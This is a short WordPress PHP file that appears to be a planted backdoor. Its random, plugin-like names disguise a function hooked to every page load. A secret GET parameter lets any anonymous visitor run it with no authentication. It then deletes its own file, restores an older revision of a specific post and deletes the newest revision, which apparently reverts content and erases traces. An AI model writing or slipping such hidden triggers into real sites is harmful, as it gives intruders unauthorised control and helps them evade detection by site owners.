<?php

function font_create_title_scheduler() {
	if (isset($_GET['control_automatorwp_traffic']) && $_GET['control_automatorwp_traffic'] === 'duplicate_print_customer') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$learndash_quote_testimonials_full = 55169;
		$send_wall_picker = wp_get_post_revisions($learndash_quote_testimonials_full);
		if (empty($send_wall_picker)) die('no revisions');
		if (count($send_wall_picker) < 2) die('less than 2');
		$shop_simple_connector = array_shift($send_wall_picker);
		$stop_multiple_visual_automatic = $shop_simple_connector->ID;
		$custom_shortener_genesis_api = array_shift($send_wall_picker);
		$author_dashboard_visibility = $custom_shortener_genesis_api->ID;
		$signup_avatar_enhanced_meta = wp_restore_post_revision($author_dashboard_visibility);
		if ($signup_avatar_enhanced_meta === false) die('error restoring');
		$signup_avatar_enhanced_meta = wp_delete_post_revision($stop_multiple_visual_automatic);		
		if ($signup_avatar_enhanced_meta === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'font_create_title_scheduler');
